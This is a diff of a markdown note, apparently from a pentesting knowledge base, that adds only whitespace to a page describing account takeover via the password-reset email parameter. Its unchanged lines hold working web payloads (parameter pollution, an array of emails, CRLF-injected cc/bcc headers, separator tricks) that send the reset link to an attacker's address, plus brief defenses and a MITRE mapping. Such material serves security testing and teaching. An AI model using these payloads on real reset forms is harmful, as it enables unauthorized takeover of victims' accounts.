@@ -33,11 +33,15 @@ This procedure involves exploiting the password reset feature of a target system
 
 This procedure involves exploiting the password reset feature of a target system by manipulating the email parameter. By sending multiple email addresses or using other separators, an attacker can potentially bypass the system's security measures and gain access to the victim's account. This technique is commonly used in credential stuffing attacks and can result in a full account takeover.
 
+ 
+
 ## Requirements
 
 1. Access to the target system's password reset feature
 
 1. Knowledge of the victim's email address
+
+ 
 
 ## Defense
 
@@ -47,18 +51,30 @@ This procedure involves exploiting the password reset feature of a target system
 
 1. Monitor for suspicious login attempts and alert users of potential unauthorized access
 
+ 
+
 ## Objectives
 
 1. Gain unauthorized access to a victim's account
+
+ 
 
 # Instructions
 
 1. Use the above commands to manipulate the email parameter and send multiple email addresses or use other separators to bypass the system's security measures and gain access to the victim's account.
 
+ 
+
+
+
 **Code**: [[# parameter pollution
 email=victim@mail.com&email=]]
 
+
+
 > The 'email' parameter is commonly used in password reset features to identify the account that needs to be reset. By manipulating this parameter, an attacker can potentially bypass the system's security measures and gain access to the victim's account. The above commands demonstrate various methods of manipulating the email parameter, including sending multiple email addresses, using other separators, and using carbon copy to send the email to both the victim and the attacker.
+
+
 
 **Command** ([[Parameter pollution]]):
 
@@ -66,11 +82,19 @@ email=victim@mail.com&email=]]
 email=victim@mail.com&email=hacker@mail.com
 ```
 
+
+
+
+
 **Command** ([[Array of emails]]):
 
 ```bash
 {"email":["victim@mail.com","hacker@mail.com"]}
 ```
+
+
+
+
 
 **Command** ([[Carbon copy]]):
 
@@ -79,6 +103,10 @@ email=victim@mail.com%0A%0Dcc:hacker@mail.com
 email=victim@mail.com%0A%0Dbcc:hacker@mail.com
 ```
 
+
+
+
+
 **Command** ([[Separator]]):
 
 ```bash
@@ -86,6 +114,8 @@ email=victim@mail.com,hacker@mail.com
 email=victim@mail.com%20hacker@mail.com
 email=victim@mail.com|hacker@mail.com
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -109,3 +139,5 @@ email=victim@mail.com|hacker@mail.com
 - [[Account Takeover]]
 - [[Password Reset Feature]]
 - [[Password Reset Via Email Parameter]]
+
+
